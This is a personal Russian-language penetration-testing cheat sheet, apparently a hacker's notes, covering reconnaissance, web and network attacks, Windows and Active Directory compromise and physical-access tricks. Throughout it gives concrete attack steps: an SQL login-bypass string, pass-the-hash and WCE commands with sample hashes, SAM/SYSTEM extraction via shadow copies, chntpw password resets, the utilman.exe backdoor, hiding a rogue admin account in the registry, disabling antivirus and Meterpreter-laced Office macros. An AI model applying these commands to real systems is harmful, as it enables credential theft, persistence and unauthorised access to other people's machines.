                                                              
Сегодня 5 Июля и я начинаю свой список всех известных мне уязвимостей, где они встречаются, как обнаружить и как исправить, а так же какие подходы использовать и прочее прочее
ТУДУ:Сделай адекватную иерархичность папок и теэктешников, так же вулны и способы и применения (их в отдельную папку с ссылкой) в 3 столбцах

Info Gagtering
        CloudFare, узнать реальный ip можно через историю айпи (http://viewdns.info/iphistory/), еще через поддомены (на них может не стоять защита) и через почтовую регистрацию, письмо может прилететь с реального ip
        По соцу, юзать Foursquare линкедин, фейсбук


Web

        XSS Все изменяемые параметры которые могут куда-то включаться

        SQL Может быть во всех изменяемых параметрах
        В инпуте авторизации можно попробовать пройти без пароля с помощью (admin' or 1=1 -- -)
        Можно попробовать загрузить шелл через неё или прочесть /etc/passwd

        CSRF

        Аутенфикация: если она обыная вебовая, то можно попробовать web tampering и попробовать просто зайти под другим методом


Net

        Social
                Делать MS Office доки с метерпретером в макросах, и заставлять юзеров их включать
                Соприкасается с физикой,Джейсон Стрит из Pwnie Express зашел в команту только для персонала, сказал что его послали проверить этот комп, выкачал оттуда БД, и унёс системный блок, профит
                Он же, однажды тестил гос учреждение, прошел через турникет тк заговорил с доверенным лицом чем дезориентировал охрану, после этого пришел в серверную и показал админу фальшивую распечатку о его задании, это сработало
                


        RDP если попробовать войти без указания пользователя "" то ты узнаешь список пользователей которых можно будет брутить

        AD или Active Directory - это контроллер домена, если на нём поднять виндовс, то он скорее всего работает с kerberos который обычно подвержен атакам золотого билета и pass-the-hash

                Kerberos-утилита отвечающая за аутенфикацию, если видишь её висящую на сервере, можно попробовать проэнуминорать юзеров и еще 2 атаки
                        Gold Ticket Kerberos: использование хеша для выдачи любому юзеру любые права, юзается с помощью мимикатза, погугли еще

        SMB-протокол доступа к файлам и принтерам
        
        SMB-Relay, если используется NTLMv1, можно юзать моуль метасплоита, для v2 есть питон скрипт с которым нужно поебаться (https://www.securitylab.ru/analytics/442313.php), но я бы погуглил что-нибудь, может и метасплоит уже поддерживает v2
        
        Pass-The-Hash: это значит, что можно авторизоваться без открытого пароля, только с помощью хеша, примерная команда (pth-smbclient --user=arm554 --pw-nt-hash -m smb3 -L 172.16.0.10 \\\\172.16.0.10\\ 6361dea164ee8fe91fe7b117fbc9ca5e), это для SMB
          PTH подходить для любых сетевых аутентификаций с помощью NTLM хешей, например можно с помощью Pass-The-Hash tookit, взять хеши залогиненных юзеров, (• whosthere.exe — получаем данные всех залогиненных пользователей; • iam.exe -h administrator:mydomain:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0— подменяем свои данные на данные другого пользователя.)
          + програмка WCE утилита вытаскивает NTLM/LM-хеши из памяти):
                      wce.exe –l
                      После этого можно выбрать из них подходящего кандидата для наших черных дел и воспользоваться его данными. Допустим, нам нужно подменить свои данные на данные другого пользователя и запустить какую-нибудь программу якобы уже из-под него:
                      wce.exe -s <username>:<domain>:<lmhash>:<nthash> \
                        -c <program>.
                      Тогда выполняем следующую команду:
                      wce.exe –s user:Victim:1F27ACDE849935B0AAD3B435B51404EE
                      :579110C49145015C47ECD267657D3174 -c "c:\Program Files\
                      Internet Explorer\iexplore.exe"
                      Здесь «-s» «добавляет» нового пользователя с именем user и доменом Victim, за которыми следует LM- и NTLM-хеш, а «-с» указывает, какую программу следует запустить под этим пользователем. 
            
        MITM

        E[poiting
                Гуглишь по каждой службе и версии сплойты на vurners.com, так же можно пробивать sn1per'ом

        ARP poisoning
        Можно юзать bettercap, arspoof, даже модуль метасплоита, в итоге возьмёшь Хеши, или что еще поинтереснее

        1C: стоит изучит стоение этой системы, основная проблема в этом, что на сервере на портах 1540,1541,1560 нет паролей, так что можно брать RCE
        
        Windows
             Есть нулевые сессии для винды, и вот одно из прог (exe) которая даст инфу (http://ntsecurity.nu/toolbox/winfo/), о пользователях
             TransportEnum-тулза узнаёт через реестр винды какие она поддерживает сетевые интерфейсы
             В стандартном арсенале винды есть команда net view, сканирует сеть
             Так же встроенные аккаунты с админом (RID 500) и юзером (RID 501), вот софт для этого, так же exe (http://ntsecurity.nu/toolbox/dumpusers/)
             Дамп хешей, можно юзать утилиту pwdump, но с хорошими правами, команда (pwdump localhost), так же её можно натравлять на машины в локалке
             Приведу список действй для дампа хешей с помощью теневого дампа SAM и SYSTEM Для начала запускаем сервис теневого копирования: cscript vssown.vbs /start. Затем создаем новую теневую копию: cscript vssown.vbs /create. Теперь смотрим список всех теневых копий: cscript vssown.vbs /list.

             Созданная нами копия будет самой последней. Из всей информации нас интересует Device object со значением «\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy14» (здесь 14 — номер теневой копии). Дальнейшие манипуляции предельно просты.
             Копируем интересующие нас файлы:copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy14\ windows\system32\config\SYSTEM . copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy14\ windows\system32\config\SAM .
             Все, теперь эти файлы можно скормить какой-нибудь утилите типа SAMInside для расшифровки полученных хешей.
             Если ты в AD то есть возможность сдампить всех пользователей домена с помощью копирование и расфишровки, как именно хз
             

Физический доступ

1)Нужна флешка с перротом, если ты не можешь войти в биос стандартным способом, то: Если ты сразу видишь загрузку Windows и не успеваешь ничего сделать, то дождись ее запуска и выполни одно из следующих действий:
                                                                                    Нажми «перезагрузить» на экране приветствия Windows, удерживая левую клавишу Shift.
                                                                                    Уже после загрузки зайди в «Параметры → Обновление и безопасность → Восстановление → Особые варианты загрузки». Нажми «Перезагрузить сейчас → Поиск и устранение неисправностей → Дополнительные параметры → Параметры загрузки».
                                                                                    Как вариант — можешь ввести shutdown.exe /R /O в командной строке.
        Можно так же отключить HDD, если корпус опечатан, не унывай и немного надави на заглушку 5.25, продави на милиметра 3 и ухватись за край, вытащи, и жимичь с компом
        Так можно получать данные
        Админские пароли, взять админа можно 3 способами, reset нуть пароль, создать нового админа или брутить хеш
        1) Выполняется тулзой chntpw которая стоит в сборке перрота что делает её фовариткой на данный момент, все что нужно сделать с ней это перейти в папку виндовых конфигов (/Windows/system32/config) и ебошить (sudo chntpw SAM), всё
        Есть еще тулзы которые можно ставить на загрузочный диск и их юзать, гугли например unpasswin, kon-boot. Winpe это восстановитель винды, через него можно менять что и как угодно
        Скрипт  HashGrab2 который запускается из любого линёвого лайвCD может разом вытянуть все пароли
        
        
        Так же вот прекрасный способ сделать себе свой админ ак, скрыть его и юзать если понадобиться, нужно: (HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon), Отыскиваем раздел SpecialAccounts или создаем его, если не нашелся. В этом разделе ищем или создаем подраздел UserList,
        а в нем — новый параметр типа DWORD с именем скрываемой учетки. Если присвоить ему нулевое значение, то соответствующая учетная запись не будет отображаться ни на экране приветствия, ни в общем списке из панели управления.
   
        Можно пойти дальше и усилить конспирацию. Для этого отыскиваем ключи с говорящим названием dontdisplaylastusername и DontDisplayLockedUserId в этой ветке: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System Первому присваиваем значение 0x00000001, а второму — 0x00000002.
        Текущий и последний использованый аккаунт также исчезнут с экрана блокировки.
        
        Можно читать файлы без явного к ним дотступа командой (more < [&lt;] passwords.txt::$DATA), или например копировать его содержимое в другой файл (more < [&lt;] passwords.txt::$DATA [&gt;]> pass.txt), нужно попробовать и с другими командами, запуском например
        
        Запустить программы можно из ФС fat32, которую можно создать и опционально скрыть, потом примонтировать, и оттуда всё запускать
        Касперский, он отключается вот этим батником (http://media.kaspersky.com/utilities/ConsumerUtilities/KLAPR.zip)
        Так же классический вариант, можно переименовать cmd.exe в untilman.exe (copy %windir%\system32\cmd.exe %windir%\system32\utilman.exe)
        Если нужно отключить груповые политики, просто физически отключи кабель локалки, войди, и потом подключи
        Обход типовых запретов на запуск файла, переименовать файл в нечто можнозапускаемое, например в winword.exe
        Обход продвинутых запретов на запуск файлов, которые проверяют не только имя файла: нужно как-то инжектировать dll, тут нужен гугол
        Можно запустить стандартные утилиты через хитрые ярлыки с помощью CLSID COM сервера, делается это так ,(md "\\.\{полный путь в папку юзера}LT3.{BB64F8A7-BEE7-4E1A-AB8D-7D8273F7FDB6}), как пример, можно подстывлять любой из CLSID
        Обход запрета сайтов-браузерные прокси плагины
        
  
  
  
Термальная атака: понадобиться тепловизор, установленный или просто принесённый тобой к клавиатуре жертвы до 30 секунд после набора ею пароля



Android
        apk можно легко ревёрсить с помощью apktool
        можно засылать ссылочный метерпретер с помощью Stagefright



